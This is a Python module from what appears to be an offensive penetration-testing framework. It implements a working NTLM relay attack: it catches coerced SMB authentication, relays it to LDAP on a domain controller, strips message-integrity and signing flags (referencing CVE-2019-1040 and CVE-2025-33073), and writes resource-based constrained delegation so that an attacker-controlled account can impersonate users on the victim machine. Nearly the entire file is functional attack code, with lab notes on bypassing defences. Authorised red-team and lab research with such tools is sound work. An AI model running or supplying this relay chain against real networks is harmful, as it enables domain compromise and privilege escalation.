"""Forward relay: coerced machine authentication -> LDAP -> RBCD on the
victim (ntlmrelayx-class; the third leg of the coercion triad).

smb_capture catches the hash and stops. This module FORWARDS: an SMB
listener (impacket's ntlmrelayx SMBRelayServer) takes the incoming
NTLM negotiate/challenge/response and hands it to a relay client that
binds LDAP on the DC — then a FORGE attack class writes RBCD on the
victim, granting SOURCE (an attacker-controlled account, e.g. one
minted by add_computer) impersonation rights on it. The s4u module
takes it from there. The full chain, all in-framework:

  coerce (fires the auth) -> relay_smb (this) -> RBCD on victim ->
  s4u -> ticket -> admin

The relay client is OURS (SambaLdapRelayClient): impacket's stock LDAP
relay client rides ldap3's SICILY binds, which Samba AD terminates on
sight — it speaks SASL NTLM (GSS-SPNEGO) instead, the same bind shape
impacket's own LDAPConnection uses and every AD module here proves
daily. Windows DCs accept both shapes, so the one client serves both.

Reality notes, learned against the labs:

  - the coerced callback is a UNC path — it carries NO port. A real
    coercion lands on the listener's 445 (root/CAP_NET_BIND_SERVICE),
    so LPORT exists for local testing only
  - the relayed NTLM negotiate's SIGN/SEAL flags can make the target
    demand LDAP signing, which breaks the relayed session — REMOVE_MIC
    (CVE-2019-1040 shape) strips them; REMOVE_SIGN_SEAL goes further
    (CVE-2025-33073) when a target demands more
  - ntlmrelayx's default does a local-auth capture FIRST and relays
    only the client's retry; coerced targets don't retry, so this
    module relays the first connection (disableMulti)
  - Samba AD refuses the RBCD self-write twice over, and both shapes
    are proven in-lab: the admin path gets constraintViolation (the
    attribute is system-only — the rbcd module's e2e), a relayed
    machine account gets insufficientAccessRights (SELF has no write on
    it). Windows DCs accept the machine account's write of its own
    attribute — that's what makes the field attack work
"""

import threading
import time

from core.module import AuxiliaryModule
from core.options import OptBool, OptInt, OptPort, OptString

try:
    from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
    from impacket.examples.ntlmrelayx.clients import (
        PROTOCOL_CLIENTS, ProtocolClient)
    from impacket.examples.ntlmrelayx.servers.smbrelayserver import (
        SMBRelayServer)
    from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
    from impacket.examples.ntlmrelayx.utils.targetsutils import (
        TargetsProcessor)
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1, ldaptypes
    from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
    from impacket.ntlm import (
        NTLMAuthChallenge, NTLMAuthChallengeResponse, NTLMAuthNegotiate,
        NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMSSP_NEGOTIATE_KEY_EXCH,
        NTLMSSP_NEGOTIATE_SEAL, NTLMSSP_NEGOTIATE_SIGN,
        NTLMSSP_NEGOTIATE_VERSION)
    from impacket.spnego import (
        SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech)
except ImportError:
    SMBRelayServer = None  # console gates run() on requirements

RBCD_ATTR = "msDS-AllowedToActOnBehalfOfOtherIdentity"


class RelayClientError(Exception):
    pass


def create_allow_ace(sid):
    """Full-control ACE for a canonical SID — ldapattack's shape."""
    ace = ldaptypes.ACE()
    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    ace["AceFlags"] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata["Mask"] = ldaptypes.ACCESS_MASK()
    acedata["Mask"]["Mask"] = 983551  # full control
    acedata["Sid"] = ldaptypes.LDAP_SID()
    acedata["Sid"].fromCanonical(sid)
    ace["Ace"] = acedata
    return ace


def create_empty_sd():
    """Empty self-relative SD owned by BUILTIN\\Administrators —
    ldapattack's shape."""
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772
    sd["OwnerSid"] = ldaptypes.LDAP_SID()
    sd["OwnerSid"].fromCanonical("S-1-5-32-544")
    sd["GroupSid"] = b""
    sd["Sacl"] = b""
    acl = ldaptypes.ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"] = 0
    acl["Sbz2"] = 0
    acl.aces = []
    sd["Dacl"] = acl
    return sd


class SambaLdapRelayClient(ProtocolClient):
    """LDAP relay client over SASL NTLM (GSS-SPNEGO): the stock
    ldap3/SICILY client gets its bind terminated by Samba AD on sight;
    this speaks the bind shape impacket's LDAPConnection proves daily
    against the same box. Windows accepts both, so one client does
    both. Drives impacket.ldap.LDAPConnection directly — sendReceive
    gives the raw bind responses the relay needs."""
    PLUGIN_NAME = "LDAP"

    def __init__(self, serverConfig, target, targetPort=389,
                 extendedSecurity=True):
        ProtocolClient.__init__(self, serverConfig, target, targetPort,
                                extendedSecurity)
        self.setClientId()

    def initConnection(self):
        # impacket.ldap appends :389 itself — a URL WITH a port becomes
        # host:389:389 and dies "name or service not known" (learned live)
        self.session = impacket_ldap.LDAPConnection(
            f"ldap://{self.targetHost}")
        return True

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def keepAlive(self):
        self.session.search(searchBase="", scope=0,
                            searchFilter="(objectClass=*)",
                            attributes=["namingContexts"])

    def getSession(self):
        return self.session

    def _bind(self, credentials):
        request = ldapasn1.BindRequest()
        request["version"] = 3
        request["name"] = ""
        request["authentication"]["sasl"]["mechanism"] = "GSS-SPNEGO"
        request["authentication"]["sasl"]["credentials"] = credentials
        return self.session.sendReceive(request)[0]["protocolOp"][
            "bindResponse"]

    def sendNegotiate(self, negotiateMessage):
        nego = NTLMAuthNegotiate()
        nego.fromString(negotiateMessage)
        # strip SIGN/SEAL asks the relayed session can't honor —
        # CVE-2019-1040 / CVE-2025-33073 shapes, ldaprelayclient's logic
        if self.serverConfig.remove_mic or self.serverConfig.remove_sign_seal:
            for flag in (NTLMSSP_NEGOTIATE_SIGN,
                         NTLMSSP_NEGOTIATE_ALWAYS_SIGN):
                if nego["flags"] & flag == flag:
                    nego["flags"] ^= flag
        if self.serverConfig.remove_sign_seal:
            if nego["flags"] & NTLMSSP_NEGOTIATE_SEAL == \
                    NTLMSSP_NEGOTIATE_SEAL:
                nego["flags"] ^= NTLMSSP_NEGOTIATE_SEAL
        blob = SPNEGO_NegTokenInit()
        blob["MechTypes"] = [
            TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]]
        blob["MechToken"] = nego.getData()
        response = self._bind(blob.getData())
        if response["resultCode"] != ldapasn1.ResultCode(
                "saslBindInProgress"):
            raise RelayClientError(
                "SASL negotiate refused: %s — %s"
                % (response["resultCode"].prettyPrint(),
                   response["diagnosticMessage"]))
        spnego = SPNEGO_NegTokenResp(response["serverSaslCreds"].asOctets())
        challenge = NTLMAuthChallenge()
        challenge.fromString(spnego["ResponseToken"])
        self.sessionData["CHALLENGE_MESSAGE"] = challenge
        return challenge

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        token = authenticateMessageBlob
        auth = NTLMAuthChallengeResponse()
        auth.fromString(token)
        if self.serverConfig.remove_mic:
            for flag in (NTLMSSP_NEGOTIATE_SIGN,
                         NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
                         NTLMSSP_NEGOTIATE_KEY_EXCH,
                         NTLMSSP_NEGOTIATE_VERSION):
                if auth["flags"] & flag == flag:
                    auth["flags"] ^= flag
            auth["MIC"] = b""
            auth["MICLen"] = 0
            auth["Version"] = b""
            auth["VersionLen"] = 0
            token = auth.getData()
        if self.serverConfig.remove_sign_seal:
            for flag in (NTLMSSP_NEGOTIATE_SIGN,
                         NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
                         NTLMSSP_NEGOTIATE_SEAL):
                if auth["flags"] & flag == flag:
                    auth["flags"] ^= flag
            token = auth.getData()
        blob = SPNEGO_NegTokenResp()
        blob["ResponseToken"] = token
        response = self._bind(blob.getData())
        if response["resultCode"] == ldapasn1.ResultCode("success"):
            return None, STATUS_SUCCESS
        report = getattr(self.serverConfig, "forge_report", None)
        if report is not None:
            report("error", "LDAP bind refused the relayed auth: %s — %s"
                   % (response["resultCode"].prettyPrint(),
                      response["diagnosticMessage"]))
        return None, STATUS_ACCESS_DENIED


class RbcdAttack(ProtocolAttack):
    """Fires once per relayed LDAP bind: grants SOURCE the right to act
    on behalf of the relayed machine account — RBCD written on the
    victim with the victim's own privileges. delegateAttack's proven
    shape: read the existing descriptor, append a full-control ACE for
    the source, replace the attribute."""
    PLUGIN_NAMES = ["LDAP"]

    def run(self):
        cfg = self.config
        victim = self.username  # the coerced (relayed) account
        if not victim.endswith("$"):
            cfg.forge_report("status", f"relayed {self.domain}\\{victim} "
                                       f"— not a machine account, RBCD "
                                       f"needs one")
            return
        cfg.forge_report("status", f"relayed {self.domain}\\{victim} — "
                                   f"LDAP bind accepted, writing RBCD")
        source = cfg.forge_source
        if not source.endswith("$"):
            source += "$"
        base = cfg.forge_base_dn or \
            "DC=" + self.domain.lower().replace(".", ",DC=")
        victim_dn = self._find_dn(victim, base)
        source_sid = cfg.forge_source_sid or self._find_sid(source, base)
        if not victim_dn or not source_sid:
            cfg.forge_report("error", f"LDAP lookup failed (victim dn "
                                      f"{victim_dn}, source sid "
                                      f"{source_sid})")
            return
        raw = self._read_sd(victim_dn)
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw) if raw \
            else create_empty_sd()
        sd["Dacl"].aces.append(create_allow_ace(source_sid))
        try:
            self.client.modify(
                victim_dn, {RBCD_ATTR: [(impacket_ldap.MODIFY_REPLACE,
                                         [sd.getData()])]})
        except Exception as e:
            message = str(e)
            if "constraintViolation" in message:
                cfg.forge_report("error", f"RBCD write denied on "
                                          f"{victim}: {RBCD_ATTR} is "
                                          f"system-only on this DC "
                                          f"(Samba — Windows DCs accept "
                                          f"this write)")
            else:
                cfg.forge_report("error", f"RBCD write failed on "
                                          f"{victim} - {e}")
            return
        cfg.forge_report("good", f"RBCD set via relay: {source} can now "
                                 f"impersonate users on {victim} — run "
                                 f"s4u from {source}")
        cfg.forge_done(source, victim, source_sid)

    def _find_dn(self, sam, base):
        for packet in self.client.search(
                searchBase=base, searchFilter=f"(sAMAccountName={sam})",
                attributes=["objectClass"]):
            if isinstance(packet, ldapasn1.SearchResultEntry):
                return str(packet["objectName"])
        return None

    def _find_sid(self, sam, base):
        for packet in self.client.search(
                searchBase=base, searchFilter=f"(sAMAccountName={sam})",
                attributes=["objectSid"]):
            if not isinstance(packet, ldapasn1.SearchResultEntry):
                continue
            for attr in packet["attributes"]:
                if str(attr["type"]) == "objectSid":
                    return ldaptypes.LDAP_SID(
                        bytes(attr["vals"][0])).formatCanonical()
        return None

    def _read_sd(self, dn):
        # ask for the attribute raw — impacket's codec dies decoding it
        # in a normal search (rbcd module's _get, same trick)
        for packet in self.client.search(
                searchBase=dn, scope=0,
                searchFilter=f"({RBCD_ATTR}=*)", attributes=[RBCD_ATTR]):
            if not isinstance(packet, ldapasn1.SearchResultEntry):
                continue
            for attr in packet["attributes"]:
                if str(attr["type"]) == RBCD_ATTR:
                    return bytes(attr["vals"][0])
        return None


class RelaySmb(AuxiliaryModule):
    name = "SMB Relay (coerced auth -> LDAP -> RBCD)"
    description = """
        Listens for inbound SMB authentication and RELAYS it to LDAP on
        the DC (RHOSTS): a coerced machine account then writes its own
        RBCD, granting SOURCE impersonation rights on it — the
        coerce -> relay -> RBCD -> s4u chain, all in-framework. Feed it
        with the coerce module (LISTENER=this host). A real coercion
        lands on 445 (UNC paths carry no port — root needed); high
        LPORTs are for local testing. Stops early on success.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptString("RHOSTS", required=True,
                                   description="LDAP target (the DC) — "
                                               "relayed auth lands here"))
        self.options.add(OptPort("LPORT", default=445,
                                 description="Port to listen on (real "
                                             "coercion needs 445; high "
                                             "port for local testing)"))
        self.options.add(OptString("SOURCE", required=True,
                                   description="Attacker-controlled account "
                                               "granted on the victim (e.g. "
                                               "one made by add_computer)"))
        self.options.add(OptString("SOURCE_SID", default="",
                                   description="Source SID (blank = look it "
                                               "up over the relayed session)"))
        self.options.add(OptString("BASE_DN", default="",
                                   description="LDAP search base (blank = "
                                               "derived from the relayed "
                                               "domain)"))
        self.options.add(OptBool("REMOVE_MIC", default=True,
                                 description="Strip MIC/sign flags "
                                             "(CVE-2019-1040 shape) — needed "
                                             "when the target demands LDAP "
                                             "signing"))
        self.options.add(OptBool("REMOVE_SIGN_SEAL", default=False,
                                 description="Also strip SEAL "
                                             "(CVE-2025-33073)"))
        self.options.add(OptInt("TIMEOUT", default=120,
                                description="Seconds to listen (stops early "
                                            "on a completed relay)"))

    def build_config(self):
        """The NTLMRelayxConfig wired FORGE-style: our RBCD attack class,
        our SASL relay client (the stock SICILY one dies on Samba), our
        reporting hooks, targets = the DC."""
        dc = str(self.get_option("RHOSTS")).strip()
        config = NTLMRelayxConfig()
        config.interfaceIp = "0.0.0.0"
        config.listeningPort = int(self.get_option("LPORT"))
        config.mode = "RELAY"
        config.smb2support = True
        # relay the FIRST connection from each host: ntlmrelayx's default
        # does a local-auth capture first and only relays the retry,
        # which real Windows clients do and our coerced targets don't
        config.disableMulti = True
        config.remove_mic = bool(self.get_option("REMOVE_MIC"))
        config.remove_sign_seal = bool(self.get_option("REMOVE_SIGN_SEAL"))
        config.runSocks = False
        config.attacks = {"LDAP": RbcdAttack}
        clients = dict(PROTOCOL_CLIENTS)
        clients["LDAP"] = SambaLdapRelayClient  # SICILY dies on Samba
        config.protocolClients = clients
        config.target = TargetsProcessor(
            singleTarget=f"ldap://{dc}", protocolClients=clients)
        config.forge_source = str(self.get_option("SOURCE")).strip()
        config.forge_source_sid = \
            str(self.get_option("SOURCE_SID") or "").strip() or None
        config.forge_base_dn = \
            str(self.get_option("BASE_DN") or "").strip() or None
        config.forge_report = self._report
        config.forge_done = self._done
        return config

    def _report(self, level, message):
        getattr(self, f"print_{level}")(message)

    def _done(self, source, victim, sid):
        self._outcome = (source, victim, sid)
        self._complete.set()

    def run(self):
        self._complete = threading.Event()
        self._outcome = None
        timeout = int(self.get_option("TIMEOUT"))
        port = int(self.get_option("LPORT"))
        config = self.build_config()
        try:
            relay = SMBRelayServer(config)  # binds in the constructor
        except Exception as e:
            self.print_error(f"listen on {port} failed - {e}")
            return
        relay.start()  # SMBRelayServer IS the thread — no wrapper
        time.sleep(1)
        if not relay.is_alive():
            self.print_error(f"listen on {port} failed — root needed for "
                             f"low ports (or it's taken)")
            return
        self.print_status(f"relay on 0.0.0.0:{port} -> ldap://"
                          f"{str(self.get_option('RHOSTS')).strip()} — "
                          f"coerce a machine at it")
        completed = self._complete.wait(timeout)
        alive = relay.is_alive()  # BEFORE the shutdown — after join
        # it's always dead and means nothing
        try:
            relay.server.shutdown()
        except Exception:
            pass
        relay.join(timeout=5)
        if not alive and not completed:
            self.print_error("relay server died mid-listen — nothing "
                             "will arrive")
            return
        if not completed:
            self.print_status("no relay completed within TIMEOUT")
            return
        source, victim, sid = self._outcome
        store = getattr(self.framework, "store", None)
        if store is not None:
            store.add_loot("rbcd",
                           f"rbcd {source} -> {victim} via relay",
                           f"{source} ({sid}) can impersonate on {victim}")
